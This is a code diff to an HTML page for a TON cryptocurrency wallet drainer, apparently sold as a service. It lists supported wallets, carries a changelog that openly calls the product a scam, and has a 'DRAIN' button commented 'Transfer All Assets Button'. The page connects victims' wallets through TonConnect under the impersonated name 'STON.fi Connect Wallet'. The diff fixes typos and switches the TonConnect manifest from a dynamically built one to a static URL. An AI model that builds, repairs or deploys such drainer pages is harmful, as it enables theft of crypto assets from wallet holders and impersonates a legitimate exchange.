@@ -12,7 +12,7 @@
         Community of buyers, constant support. <br>
         As a gift are a few popular offers!
     </p>
-    <h2>Supported Walleсясясts:</h2>
+    <h2>Supported Wallets:</h2>
     <ul>
         <li>Tonkeeper</li>
         <li>TG Wallet</li>
@@ -40,7 +40,7 @@
     <ul>
         <li>The operation of the NFT scan has been changed again</li>
         <li>Token evaluation system has been redesigned</li>
-        <li>Marked as scam NFTsч are eliminated</li>
+        <li>Marked as scam NFTs are eliminated</li>
         <li>Speeded up the work</li>
         <li>Price is determined by AVG</li>
         <li>Redesigned scam in a more pleasing for the eye look</li>
@@ -51,22 +51,12 @@
     <button onclick="didtrans();" style="margin-top: 30px; font-size: 24px;">DRAIN</button> <!-- Transfer All Assets Button -->
 
     <script>
-        // Create tonconnect-manifest.json dynamically to ensure it is available
-        const manifest = {
-            "url": window.location.origin,
-            "name": "STON.fi Connect Wallet",
-            "iconUrl": window.location.origin + "/logo.png",
-            "termsOfServiceUrl": window.location.origin + "/terms",
-            "privacyPolicyUrl": window.location.origin + "/privacy"
-        };
-
-        // Save the manifest JSON file to ensure availability
-        const blob = new Blob([JSON.stringify(manifest)], { type: 'application/json' });
-        const manifestURL = URL.createObjectURL(blob);
+        // Static tonconnect-manifest.json URL instead of dynamic creation
+        const manifestUrl = window.location.origin + '/tonconnect-manifest.json';
         
         // Initialize TonConnect with manifest URL
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: manifestURL,
+            manifestUrl: manifestUrl,
             buttonRootId: 'ton-connect'
         });
     </script>
